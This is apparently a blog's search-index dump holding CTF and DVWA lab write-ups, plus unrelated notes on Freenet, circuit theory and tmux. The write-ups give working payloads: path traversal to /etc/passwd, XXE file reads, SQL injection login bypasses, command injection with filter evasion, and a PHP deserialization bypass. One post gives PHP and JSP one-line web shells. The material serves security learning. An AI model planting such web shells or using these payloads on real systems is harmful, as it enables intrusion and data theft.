matches up with the results. Take the first row:\n0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99\n\nWe have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).\nIn the next task we’ll look at cracking this hash.\n","categories":["security"],"tags":["web"]},{"title":"BUU OTHERS","url":"/2021/03/21/security/ctf/buu/buu-others/","content":"Basic LabBUU LFI COURSE 1&lt;?php/** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */highlight_file(__FILE__);if(isset($_GET[&#x27;file&#x27;])) &#123;    $str = $_GET[&#x27;file&#x27;];    include $_GET[&#x27;file&#x27;];&#125;\n\n文件包含漏洞，通过目录穿越获取flag\nhttp://17573c3f-a5f5-496e-b281-fb8fa9e48eef.node3.buuoj.cn/?file=../../../flag\n\nflag{18203b8a-a0fc-4379-81e1-96a8c758c464}\nReal[PHP]XXE1XXE: XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。\nhttps://github.com/vulhub/vulhub/blob/master/php/php_xxe\nhttps://github.com/vulhub/vulhub/blob/master/php/php_xxe\n\nlibXML support\tactivelibXML Compiled Version\t2.8.0\n\npayload:\nPOST /simplexml_load_string.php HTTP/1.1Host: node3.buuoj.cn:27468User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 168&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;\n\n\n\n\n\nN1book[第一章 web入门]常见的搜集1]访问如下敏感文件即可获取flag\nrobots.txtindex.php~.index.php.swp\n\nn1book{info_1s_v3ry_imp0rtant_hack} \n","categories":["ctf"],"tags":["buu"]},{"title":"Freenet","url":"/2021/03/21/cs/freenet/","content":"FreenetIntroFreenet is a peer-to-peer platform for censorship-resistant[防审查] communication.It uses a decentralized[去中心化] distributed data store to keep and deliver information, and has a suite of free software for publishing and communicating on the web without fear of censorship. Both freenet and some of its associated tools were originally designed by lan Clarke, who defined Freenet’s goal as providing freedom of speech on the Internet with strong anonymity[匿名的] protection.\nThe distributed data store of freenet is used by many third-party programs and plugings to provide microblogging and media sharing, anonymous and decentralised version tracking, blogging, a generic[通用的] web of trust for decentralized spam resistance [防垃圾邮件], Shoeshop for using Freenet over Sneakernet, and many more.\nHistoryThe origin of Freenet can be traced to lan Clarke’s student project at  the University of Edinburgh, which he completed as graduation requirement in the summer of 1999 lan Clarke’s resulting unpublished report “A distributed” decentralized information storage and retrieval[恢复] system” provide foundation for the seminal paper written in collaboration with other researchers, “Freenet: A Distributed Anonymous Information Storage and Retrieval System” (2001). According to CiteSeer, it became one of the most frequently cited computer science articles in 2002.\nResearchers suggested that Freenet can provide anonymity on the Internet by storing small encrypted sinppets[片段] of content distributed on the computers of its users and connecting only through intermediate[中间的] computers which pass on requests for content and sending them back without knowing the contents of the full file, similar to how routers on the Internet route packets without konwing anything about files-except Freenet has caching, a layer of string encryption, and no reliance on centralized structures. This allows users to publish anonymously or retrieve various kinds of information.\nFreenet has been under continuous development since 2000.\nFreenet 0.7, release on 8 May 2008, is a major re-write incorporating[合并] a number of fundamental changes. The most fundamental change is support for darknet operation. Version 0.7 offered two modes of operation: a mode in which it connects only to friends, and an opennet-mode in which it connects to any other Freenet user, Both modes can be run simultaneously[同时], When a user switches to pure darknet operation, Freenet becomes very difficult to detect from the outsite. The transport layer created for the darknet mode allows communication over restricted routes as commonly found in mesh networks, as long as these connections follow a small-world structure. Other modifications include switching from TCP to UDP, which allows UDP hole punching[打洞] with faster transmission of messages between peers in the network.\nUpadting…\nref: https://en.wikipedia.org/wiki/Freenet\n","categories":["cs"],"tags":["network"]},{"title":"BUU WEB","url":"/2021/03/21/security/ctf/buu/buu-web/","content":"BUU CTF WEB[极客大挑战 2019]EasySQL1]帐号输入 ‘ or ‘1’&#x3D;’1 \n密码输入 ‘ or ‘1’&#x3D;’1 \nflag{b43c9a0f-dd16-4432-a859-253f56cd993b}\n[极客大挑战 2019]Havefun1]F12查看源码，查看到提示\n&lt;!--        $cat=$_GET[&#x27;cat&#x27;];        echo $cat;        if($cat==&#x27;dog&#x27;)&#123;            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;        &#125;--&gt;\n\n通过get请求使cat参数值为dog即可获取flag\n?cat&#x3D;dog\npayload: http://7985269e-06f7-431a-9938-ff0e590251cf.node3.buuoj.cn/?cat=dog\nflag{90b2e805-de37-428a-8911-bfd1ab0bb3ae}\n[SUCTF 2019]EasySQL1]Give me your flag, I will tell you if the flag is right. \n试了特殊符号，没有回显，sqlmap也没跑出来\n这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到\n回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from \nFlag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。\n可以堆叠注入\n1;show databases; 1;show tables;  \n\n非预期解\n*,1\n\n内置的sql语句为 sql &#x3D; “select.post[‘query’].”||flag from Flag”;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容 \n预期解\n在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能\n1;set sql_mode=PIPES_AS_CONCAT;select 1\n\n输入的内容为1;set sql_mode&#x3D;pipes_as_concat;select 1\n其中set sql_mode&#x3D;pipes_as_concat;的作用为将||的作用由or变为拼接字符串\nArray ( [0] &#x3D;&gt; flag{34e37110-652b-4656-b899-590fefa7c0c7} [1] &#x3D;&gt; 1 )\nref: https://blog.csdn.net/qq_43619533/article/details/103434935\n[ACTF2020 新生赛]Include1存在目录穿越漏洞\nhttp://326f1184-6af6-41e1-b6d7-146fbc0ac01f.node3.buuoj.cn/?file=../../../etc/passwd\n但找不到flag，存在php文件里了，在访问php文件时，需要解释php，所以采用php伪协议转化为base64编码，来获取文件内容\n?file=php://filter/convert.base64-encode/resource=flag.php\n\n&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;ebe804c8-f8f9-45f4-8c75-b818b2db28f4&#125;\n\n访问index.php\n?file=php://filter/convert.base64-encode/resource=index.php\n\nindex.php\n&lt;meta charset=&quot;utf8&quot;&gt;&lt;?phperror_reporting(0);$file = $_GET[&quot;file&quot;];if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;\texit(&#x27;hacker!&#x27;);&#125;if($file)&#123;\tinclude($file);&#125;else&#123;\techo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;&#125;?&gt;\n\n\n\n\n\n[极客大挑战 2019]Secret File1]f12查看源码发现\nhref&#x3D;”.&#x2F;Archive_room.php”\n访问点击secret后啥也没发现，在Archive_room.php下发现 href&#x3D;”.&#x2F;action.php”\n访问.&#x2F;action.php后自动跳转至end.php，通过bp抓包获得\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;!--   secr3t.php        --&gt;&lt;/html&gt;\n\n访问 secr3t.php  得到如下\n&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#x27;file&#x27;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;\n\n阅读源代码只过滤了部分字符，可以通过php伪协议将flag.php进行base64编码输出\npayload\n/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php\n\nflag{86cfc1f0-76c3-413a-9049-0f3cfee7cda3}\n[极客大挑战 2019]LoveSQL1]给了一句话使用sqlmap是没有灵魂的\n用户名输入admin，密码输入’or ‘1’&#x3D;’1\n成功登录，显示如下\nHello admin！Your password is &#x27;4382e7984516bd7775c71b8b6a4aeae3&#x27;\n\n但什么也没有，password也不是flag，那得采用sqlmap来试试，以失败告终。\n采用爆破\n爆破字段通过以下来不断增加数字，来爆破字段\nadmin&#x27; order by 1 #\n\n在输入框输入#符号时，采用%23来代替\n/check.php?username=admin&#x27; order by 4 %23&amp;password=1\n\n爆破到4的时候\n出现错误，说明字段数为4\n通过union来测试注入点/check.php?username=1&#x27; union select 1,2,3%23&amp;password=1\n\n用户名打印2，密码打印3\n爆破数据库\n\n\n\nref: https://segmentfault.com/a/1190000022535775\n[GXYCTF2019]Ping Ping Ping1]过滤了空格，&#x2F;, flag,还有{}等符号，采用$IFS$9来代替空格，&lt;&gt;也过滤了。\n&#x2F;?ip&#x3D;i0gan.cn;a&#x3D;g;b&#x3D;f;c&#x3D;.php;ls;cat$IFS$9index.php;echo$IFS$9fla$a.php;cat$IFS$9fla$a.php\n/?ip=PING i0gan.cn (121.5.5.167): 56 data bytesflag.phpindex.php/?ip=|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123;    echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;    die(&quot;fxck your space!&quot;);  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;    die(&quot;fxck your bash!&quot;);  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;    die(&quot;fxck your flag!&quot;);  &#125;  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&quot;;  print_r($a);&#125;?&gt;\n\n不知道为什么打印cat flag.php。\n其他技巧内联执行\n?ip=1|cat$IFS$1`ls`1\n\nsh命令\n?ip=1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh#Y2F0IGZsYWcucGhw为cat flag.php的base64编码\n\n\n\n[ACTF2020 新生赛]Exec1]啥也没过滤\npayload:\n;cat /flag\n\n\n\n\n\n[极客大挑战 2019]Knife1]AntSword直接连接，密码为Syc，在根目录下找到flag\nflag{6e339abb-c408-45b5-883c-9bb75796058d}\n[极客大挑战 2019]PHPdirsearch扫\n扫描结果如下:\n[16:04:20] 429 -  568B  - /wsadmin.traceout [16:04:20] 429 -  568B  - /wsadmin.valout [16:04:21] 429 -  568B  - /wsadminListener.out [16:04:21] 429 -  568B  - /wshell.php [16:04:22] 200 -   6KB - /www.zip    [16:04:22] 429 -  568B  - /xprober.php             [16:04:22] 429 -  568B  - /xshell.php   [16:04:22] 429 -  568B  - /xsl/ [16:04:22] 429 -  568B  - /xsl/_common.xsl [16:04:22] 429 -  568B  - /xsl/common.xsl\n\n扫到了www.zip文件\n存在class.php,flag.php,index.php\n&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;\n\nphp反序列化\nindex.php\n&lt;?php    include &#x27;class.php&#x27;;    $select = $_GET[&#x27;select&#x27;];    $res=unserialize(@$select); ?&gt;\n\n\n\n通过php构造Name 类序列化\n&lt;?phpclass Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;&#125;$a = new Name(&#x27;admin&#x27;, 100);var_dump(serialize($a));?&gt; \n\n打印如下:\nstring(77) &quot;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;&quot;\n\n即序列字符串如下\nO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\n由于在进行序列化的时候调用了__wakeup函数，导致usename重新赋值为guest，那么现在要考虑如何绕过__wackup函数了。\n如何跳过__wackup函数，在反序列化字符串时，若属性个数大于实际的属性个数时，会跳过__wakeup函数。\n以上将2改为3即可\nO:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\n不过还是没有结束，因为这个声明变量是private\nprivateprivate 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度\n再次改造一下序列化\nO:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;\n\nref: https://segmentfault.com/a/1190000022534926\n","categories":["ctf"],"tags":["web"]},{"title":"WEB安全一句话木马","url":"/2021/03/21/security/web/web_trojan_horse/","content":"一句话木马phpeval($_POST[&#x27;i0gan&#x27;]);\n\n通过antsword,点击鼠标右键，添加数据，填入url，输入密码为i0gan即可连接web shell\njsp&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;\n\nRuntime 类封装了运行时的环境。每个 Java 应用程序都有一个 Runtime 类实例，使应用程序能够与其运行的环境相连接。使用 getRuntime() 构建 Runtime 类实例。 getRuntime() 返回与当前 Java 应用程序相关的运行时对象。获取实例后调用 exec() 方法执行系统命令。\n  request 为 JSP 内置对象，getParameter() 方法获取请求参数 cmd的值构建命令 。\n请求URL：http://127.0.0.1/shell.jsp?cmd=calc\n\n\n\n","categories":["security"],"tags":["web"]},{"title":"DVWA","url":"/2021/03/21/security/dvwa/","content":"DVWAEnvgithub: https://github.com/digininja/DVWA\ndocker install:\ndocker run --rm -it -p 80:80 vulnerables/web-dvwa\n\nconfiure\nAfter set databases input admin and password to login dvwa \nIntroDamn Vulnerable Web Application (DVWA) is a PHP&#x2F;MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students &amp; teachers to learn about web application security in a controlled class room environment.\nThe aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface.\nSecurity LevelYou can set the security level to low, medium, high or impossible. The security level changes the vulnerability level of DVWA:\n\nLow - This security level is completely vulnerable and has no security measures at all. It’s use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.\nMedium - This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.\nHigh - This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.\nImpossible - This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.Prior to DVWA v1.9, this level was known as ‘high’.\n\nlevel lowBrute force\nMethod 1: \ncrack password\nUse Burp Suite to crack the password, Ctrl + i copy package to Intruder mode, click clean $ and reset $ to password parm. add a words to payloads, click start attack. found response length is different from others, maybe this is password.\n20\tpassword\t200\tfalse\tfalse\t4704\t\n\n\n\nMethod 2:\nsql injection\nsource code as follows:\n&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123;    // Get username    $user = $_GET[ &#x27;username&#x27; ];    // Get password    $pass = $_GET[ &#x27;password&#x27; ];    $pass = md5( $pass );    // Check the database    $query  = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row[&quot;avatar&quot;];        // Login successful        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;        echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;;    &#125;    else &#123;        // Login failed        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; \n\nWe found that this source code has a sql injection vulnerabilities.\nSo we can choose one of account or password  to insert sql then bypass the login authentication.\npayload:\nset account as: \nadmin&#x27; or &#x27;1&#x27;=&#x27;1  \n\n You can set password as any words \n","categories":["security"],"tags":["web"]},{"title":"The fundamentals of Analog Electronics Technology","url":"/2021/03/12/school/analog-electronics-technology/","content":"The Fundamentals of Analog Electronics Technology直流电路基本概念1、支路：\n\n每个元件就是一条支路。\n串联的元件我们视它为一条支路。\n在一条支路中电流处处相等。\n\n2、节点：\n\n支路与支路的连接点。\n两条以上的支路的连接点。\n广义节点（任意闭合面）。\n\n3、回路：\n\n闭合的支路。\n闭合节点的集合。\n\n4、网孔：\n\n其内部不包含任何支路的回路。\n网孔一定是回路，但回路不一定是网孔。\n\n基尔霍夫定律介绍基尔霍夫（电路）定律(Kirchhoff laws)是电路中电压和电流所遵循的基本规律，是分析和计算较为复杂电路的基础，1845年由德国物理学家G.R.基尔霍夫（Gustav Robert Kirchhoff，1824～1887）提出。基尔霍夫（电路）定律包括基尔霍夫电流定律（KCL）和基尔霍夫电压定律（KVL）。\n基尔霍夫（电路）定律既可以用于直流电路的分析，也可以用于交流电路的分析，还可以用于含有电子元件的非线性电路的分析。\n基尔霍夫第一定律（KCL）定义基尔霍夫第一定律又称基尔霍夫电流定律，简记为KCL，是电流的连续性在集总参数电路上的体现，其物理背景是电荷守恒公理。基尔霍夫电流定律是确定电路中任意节点处各支路电流之间关系的定律，因此又称为节点电流定律。基尔霍夫电流定律表明：\n\n所有进入某节点的电流的总和等于所有离开这节点的电流的总和。\n\n或者描述为：\n\n假设进入某节点的电流为正值，离开这节点的电流为负值，则所有涉及这节点的电流的代数和等于零。\n\n其中， 是第k个进入或离开这节点的电流，是流过与这节点相连接的第k个支路的电流，可以是实数或复数。\n基尔霍夫第二定律（KVL）定义基尔霍夫第二定律又称基尔霍夫电压定律，简记为KVL，是电场为位场时电位的单值性在集总参数电路上的体现，其物理背景是能量守恒。基尔霍夫电压定律是确定电路中任意回路内各电压之间关系的定律，因此又称为回路电压定律。基尔霍夫电压定律表明：沿着闭合回路所有元件两端的电势差（电压）的代数和等于零。或者描述为：沿着闭合回路的所有电动势的代数和等于所有电压降的代数和。以方程表达，对于电路的任意闭合回路，其中，m 是这闭合回路的元件数目， vk是元件两端的电压，可以是实数或复数。基尔霍夫电压定律不仅应用于闭合回路，也可以把它推广应用于回路的部分电路。\n换路定则如果电路中含有动态元件（电感或电容），则该电路称为动态电路。动态电路的一个特征是当电源突然接入或断开，电路结构或元件参数突然改变时，电路中的电流或电压可能要经过一个变化过程才能达到稳定。这是由于储能元件能量的积累和释放都需要一定的时间。分析电路从一种稳定状态转变成另一种稳定状态的过程称为瞬态分析或暂态分析。当电路结构或参数发生变化时，会引起电路变化，此时称为“换路”，并认为换路即刻完成。通常把换路时刻取为0,用t_0表示换路开始前的一瞬间，启始时刻，t=0+表示换路开始后的一瞬间，称初始时刻。它们反映了两种不同的物理状态。若换路瞬间电容电压为uc(0-)，换路后瞬间电容电压为uc(0+)，则\n换路过程中，若电容电流为有限值，则积分项为0，即同理对于电感来说以上两式子称为换路定则，它只适用于换路瞬间，且电容电流、电感电压均为有限值。根据换路定则可求出t=0+时各个支路电流电压的初始值。所以初始条件就是求变量在换路后瞬间的值。\n问题1. 多子是空穴的杂质半导体中掺入的元素是几价元素？2. 在二极管应用电路分析时，若信号源电压只有1v，则采用二极管什么等效模型？3.  在二极管应用中的发射极电阻Re作用是？4. 在三种不同结构的放大电路中共基极放大电路的输入电阻Ri为什么？5. 直接耦合放大电路存在零点漂移的原因是什么？6. 若一对信号分别为0.6v和0.4v，那么它们的共模信号大小为几v？7. 在输入量不变的情况下，若引入反馈后（），则说明引入是正反馈？8. 不属于和不属于负反馈对放大电路性能影响分别是？10. 阻容耦合共射放大电路在输入信号频率较高时放大倍数下降的原因是？11. 通常，比较器的输出有几种状态？12. 在正弦波振荡电路组成中，若放大网络为反相比例放大器，那么正反馈网络的相移应为几度？13. 压控振荡器(VCO)中的“压”是指什么？14. A类功率放大器亦称甲类功放，功率放大电路中的晶体管在信号的什么周期内导通。15. A类功率放大器亦称甲类攻放，功率放大电路中晶体管的静态工作点设置在什么地方？16. 整流的目的是？17.","categories":["school"],"tags":["school"]},{"title":"tmux 基本命令","url":"/2021/03/09/env/linux/tmux/","content":"tmuxLinux终端共享分屏神器tmuxtmux几大特色\n会话与窗口解绑，终端执行的任务不再因为关闭窗口而中断会话共享，tmux的会话可以被多人共享，同时操作，方便异地操作支持窗口被水平垂直任意分割\n开启tmux从终端Terminal进入tmux界面\ntmux先介绍tmux的几个概念session，windows，panel，和prefix\nprefix（前缀键）为了区分输入和快捷键，tmux设置了一个前缀组合键Ctrl+B，按下前缀组合键后松开，再按下快捷键操作，我们将这个组合键称作prefix，尝试使用prefix+%在当前window创建一个panel\nsession（会话）新建一个session\ntmux new -s session_name\n\n\nsession_name是自定义的会话的名字，通过tmux命令直接建立的session的名字会默认以数字0,1，…开始命名\n临时退出session临时退出的session会在后台运行\ntmux detach\n\n\n快捷键prefix+d\n回到已存在的session中\ntmux a -t session_name\n\n\n回到上一个使用的session\ntmux a\n\n\ntip：\n尝试在tmux中执行程序，并利用tmux的detach功能让其在后台运行。尝试在不同电脑上同时连入一个session进行操作查询当前session列表\ntmux ls\n\n\n以下为我的session列表\n切换session\ntmux switch -t session_name\n\n\n\n结束session结束当前session快捷键prefix+:，输入命令kill-session\n结束所有session快捷键prefix+:，输入命令kill-server\n结束指定session\ntmux kill-session -t session_name\n\nwindows（窗口）同一个session可以有多个窗口,这些窗口就像多个桌面一样\n新建窗口快捷键prefix + c\n切换窗口切换到下一个窗口快捷键prefix + n\n切换到上一个窗口快捷键prefix + p\n切换到指定窗口快捷键prefix + 窗口编号\npanel（窗格）窗格为我们同时提供了多个界面，方便了需要多个界面同时显示的操作\n创建新的窗格上下分屏\ntmux split-window\n\n\n快捷键prefix + “\n左右分屏\ntmux split-window\n\n\n快捷键prefix + %\n关闭窗格\nexit\n\n\n快捷键prefix + x\n切换窗格快捷键prefix，再按↑、↓、←、→键切换\n调整窗格大小快捷键prefix，按住ctrl，同时按↑、↓、←、→键\n查看版本不同的版本，tmux的设置和快捷键可能有所不同\ntmux -V\n切换鼠标模式开启鼠标控制快捷键prefix+:\n输入命令\nset mouse on\n\n\n\n关闭鼠标控制快捷键prefix+:\n输入命令\nset mouse no\n\n\n\n开启模式\t关闭模式鼠标左键\t点击可以切换panel\t可以选定文本鼠标中键滚轮\t滑动可以只针对当前panel\t滑动会对当前窗口鼠标右键\t无反应\t终端的右键选项窗口使用过后明显感觉到，开启模式下，虽然对panel的操作更友好了，但是复制文本的时候就变的麻烦了，只要长按shift键，就会发现鼠标临时回到了关闭模式下的操作。\ntmux美化\nhttps://github.com/gpakosz/.tmux\n","categories":["env"],"tags":["linux"]},{"title":"D0g3 PWN3面任务.md","url":"/2021/03/08/school/d0g3-pwn-3%E9%9D%A2%E4%BB%BB%E5%8A%A1/","content":"PWN 假期 3面任务\n详细复现极客大挑战所有pwn题\n\n学习中级rop，适当了解点高级rop\n\n熟练掌握glibc 2.23下的 house of einherjar, unlink, off by one, fastbin attack, 了解house of 家族\n\n攻防世界提高篇刷题至少1.5页 [不懂的可以搜wp，注意以学习为主，要弄明白其中的原理]\n\n\n相信自己，你可以完成! 完成了交报告给i0gan, 报告就写上面所刷的题wp和你不明白的地方还有你的收获。然后就可以正式加入道格了，一句话，加油，中途不明白的可以问i0gan！\n学习参考:\nhttps://ctf-wiki.org/pwn/readme/\nhttps://adworld.xctf.org.cn/\n","categories":["school"],"tags":["d0g3"]},{"title":"人性成长笔记","url":"/2021/03/04/life/ic/%E4%BA%BA%E6%80%A7%E6%88%90%E9%95%BF/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e33897720c69d68f5ba8688afe6e2b19b79094cd284a9acce3f7970ac3a6432181873116dcff8a2aa32748cd29f469cc620240e58527a3fc6b1bbc3b481b53176979e8967d754f6bc77f49ecbb7cc75fe235169aa35d608310151edc07d746698bd63fe1894aa766dd193a7399953200802ae9592a5441e863d4810c10af968ada03e2121589b156def63d7eb5e5dee168d19645979ee7a8420a417c960c2b81b9cd52a4601e2589e7004481cb8c4ab0cf665dc3695e4aaa4395b663d58fd80bd9ee5f5891a482f5fd7097e1023d42e885c8abb17fc59105dd74fd782afc4c5e6b493412bd1a09f1b8808095b856e11280155f21271fa21f9257294b861dbfa08c68c3a7534d471726c3b2581328612603bf2dafa666bf0b327de33e86a4ed442527b81ea009faa12743728fcf11922b76d53183e3dd9e12815fd5f54e4b426b46481ba8639f1a15b0ff60fd6bd3ffe5d7152d30c0f22aa92e55128dbac009d96558d9004a1f7d41c447d87609628a1d39315540dd04286e540768dfe167b29d661db9eb95032cc3a32ab437f3d4c45a06df49b0c1bc48ee3c72419b1a7a0b51a5265bd260f4311bfbd6f977fa5c3bc4c5ee9beb20abd4c75e24b3e10a55dd563dc5cd62d4de801537aa21063e2f411d9a9e17d7989e39244a3f7c119c6c85e968afdab2d68eb276b3912a694cc443eb47bf0272cfc14f4bb2a7cf206ec3a90006c55ca4c06a2dc5b480d0af36b63487195edfb25b12480aef2861d4d3eddacf43c9aee0324a986fc6e7ccb5f610dc6da5b5ef29b48941ec8c431c2be9f2272ca375fb4440c0c0756b09f36385a970c8c1ff4d3f3d48cb532df5b66ad029bd6daf52d77e2c2dfdecc5187ff0b9b005f3b45291bfa1da953e1152a58195618787905ad62767d437cb6c1982bb17caefe5f8dbde6de61fc75e1f7ac64a5a79cdd52d654714fd20bfbbf566ae861542aec9dc9848bc38ba427bd7c20dd13709479e8f1f743539ac0c6d9eb83cc97b8a1ac7eedb253003a0e15c8b3f5e1f76597391b8f8bfe1a8bd2735599721e2054c1d31ab72bb554890f32c7920932272297b3533e81256e0bac4cc11f183fde7dc19388ae81b8802392ee92368109a91202c09ec8b80293f173a3c7a86444d965fa89bdefbb013e3a6022149ae08776b6d1114712e29a8241869a0de9de5c5f47a5ddbae63f92f20e51ba08b060474902df543f53b2d34ea5fea0144e3f72f5c74a25656a1eac8271d552c927875ab2a5783b7ec3acedb5c7b5dcde7fd260f2e8d616df8346dd40bdc5fbe7e826349622ff71df2dcec079c5b64c020c9a8b728b80a1bef0450fcd95d58cce53152c2a8b4bfb8b9f007fd498adf384d9702de2395eb8ae4abe7f6ffead26789204b3c7c08e9baf3e52a02bca66a2b912f36bc542a72eef6f455ed5ac15d3130c1f11bc4b5fbe4ac4e3a21e91ed636a9c114c6ae95e456228e818d60cccaf015dbed4bb42a5aeb2e48c19f1a8a783261c1a2fba7022f5a8840b830ff2ac5ea993bed8bca2d13549761acc8c13357070a64e59d191a27c5b535822cab30010c518785deb3ad5e62e66feb305862da96bf4bd5043a4b4788c858eecf3fe0ee757922d5027691164889f9e54be0706a760325c35cdac80655df50aa21556fe097dc625177a8ad6346626b14361f68a59780b1a3ff5ee14db14e9bb1df932caeba2f3bf1af6088ef282f0c35c6d29c758a1b0adf36e38cb0ae7334562b2a05f5e8328326b1c2d403bc186244dfcd1479542a92cae2d4818d99cb20ff468b6c7ced459a5498fbd17366ac7bc1a26b32ec6cf071b2ae2fe7b7271994a652ec29b3b1a